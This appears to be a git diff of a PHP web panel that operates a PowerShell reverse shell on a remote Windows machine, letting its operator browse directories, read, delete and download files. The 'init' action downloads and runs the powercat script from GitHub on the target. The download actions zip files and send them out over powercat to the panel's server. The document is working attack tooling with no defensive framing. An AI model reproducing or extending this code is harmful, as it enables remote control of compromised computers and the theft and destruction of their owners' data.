@@ -46,6 +46,15 @@ class DirectoryData
             }
             if (strpos($line, 'Directory') !== false) {
                 $this->directory = trim(str_replace('Directory:', '', $line));
+            } else if (strpos($line, 'Répertoire') !== false) {
+                error_log("ca passe la");
+                $this->directory = trim(str_replace('Répertoire :', '', $line));
+                $splitted = explode(':', $line);
+                $this->directory = $splitted[1];
+                for ($i = 2; $i < count($splitted); $i++){
+                    $this->directory .= ':' . $splitted[$i];
+                }
+                $this->directory = trim($this->directory);
             }
         }
         $this->files = $lines;
@@ -121,11 +130,13 @@ if (isset($_POST['action'])) {
             sleep(1);
             // $cmd = 'start-job -ScriptBlock {. ' . $powercatFolder . '/powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' 
             //     . $fileTransferPort . ' -i ' . $filePath . '}';
-            $cmd ='. ' . $powercatFolder . '/powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $filePath;
+            // $cmd ='. ' . $powercatFolder . '\powercat.ps1; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i "' . $filePath . '";';
+            $cmd = 'powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i "' . $filePath . '";';
             $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
             fwrite($handle, $cmd);
             fclose($handle);  
             // echo "saving file";
+            echo $filePath;
         break;
 
         case "downloadZip":
@@ -140,16 +151,19 @@ if (isset($_POST['action'])) {
                 // powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $zipPath . '; Remove-Item -Path ' . $zipPath . '-Force;}';
             // $cmd = '. ' . $powercatFolder . '/powercat.ps1; Compress-Archive -Path ' . $filePath . '-DestinationPath ' . $zipPath . '; 
             //     powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $zipPath . '; Remove-Item -Path ' . $zipPath . '-Force;';
-            $cmd = '. ' . $powercatFolder . '/powercat.ps1; Compress-Archive -Path ' . $filePath . ' -DestinationPath ' . $filePath . '.zip; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i ' . $filePath . '.zip; Remove-Item -Path ' . $filePath . '.zip -Force;';
+            // $cmd = '. ' . $powercatFolder . '\powercat.ps1; Compress-Archive -Path "' . $filePath . '" -DestinationPath "' . $filePath . '.zip"; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i "' . $filePath . '.zip"; Remove-Item -Path "' . $filePath . '.zip" -Force;';
+            $cmd = 'Compress-Archive -Path "' . $filePath . '" -DestinationPath "' . $filePath . '.zip"; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i "' . $filePath . '.zip"; Remove-Item -Path "' . $filePath . '.zip" -Force;';
             $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
             fwrite($handle, $cmd);
             fclose($handle);  
+            echo "folder: ";
+            echo $powercatFolder;
             // echo "saving file";
         break;
 
         case "go":
             error_log("Received go action");
-            $cmd = "cd " . $_POST['command'] . "; Get-ChildItem -Force";
+            $cmd = "cd '" . $_POST['command'] . "'; Get-ChildItem -Force;";
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
             $jsonData = new DirectoryData;
             $jsonData->initFromReverseResult($result);
@@ -158,7 +172,7 @@ if (isset($_POST['action'])) {
 
         case "parent":
             error_log("Received parent action");
-            $cmd = "cd .. ; Get-ChildItem -Force";
+            $cmd = "cd .. ; Get-ChildItem -Force;";
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
             $jsonData = new DirectoryData;
             $jsonData->initFromReverseResult($result);
@@ -167,7 +181,7 @@ if (isset($_POST['action'])) {
 
         case "delete":
             error_log("Received delete action");
-            $cmd = "Remove-Item -Path" . $_POST['command'] . " -Force ; Get-ChildItem -Force";
+            $cmd = "Remove-Item -Path '" . $_POST['command'] . "' -Force ; Get-ChildItem -Force;";
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
             $jsonData = new DirectoryData;
             $jsonData->initFromReverseResult($result);
@@ -176,7 +190,7 @@ if (isset($_POST['action'])) {
         
         case "deleteFolder":
             error_log("Received deleteFolder action");
-            $cmd = "Remove-Item -Path" . $_POST['command'] . " -Recurse -Force ; Get-ChildItem -Force";
+            $cmd = "Remove-Item -Path '" . $_POST['command'] . "' -Recurse -Force ; Get-ChildItem -Force;";
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
             $jsonData = new DirectoryData;
             $jsonData->initFromReverseResult($result);
@@ -185,26 +199,29 @@ if (isset($_POST['action'])) {
 
         case "print":
             error_log("Received print action");
-            $cmd = "Get-Content -Path " . $_POST['command'] . " -Encoding UTF8";
+            $cmd = "Get-Content -Path '" . $_POST['command'] . "' -Encoding UTF8;";
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
             echo substr($result, 0, strrpos($result, "\n"));
         break;
         
         case "init":
             error_log("Received init action");
-            $cmd = '(New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1", "./powercat.ps1"); . ./powercat.ps1';
+            $cmd = '$path=$pwd.path; (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1", "$path\powercat.ps1"); . .\powercat.ps1;';
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
-            $powercatFolder = substr($result, 0, -2);
+            $powercatFolder = substr(substr($result, 0, -2), 3);
             echo $result;
         break;
 
         case "list":
             error_log("Received list action");
-            $cmd = "Get-ChildItem -Force";
+            $cmd = "Get-ChildItem -Force;";
             $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
             $jsonData = new DirectoryData;
             $jsonData->initFromReverseResult($result);
             echo json_encode($jsonData);
+            $handle = fopen("../test", 'w') or die('Cannot open file: ../cmd/test');
+            fwrite($handle, $result);
+            fclose($handle);
         break;
 
         default:
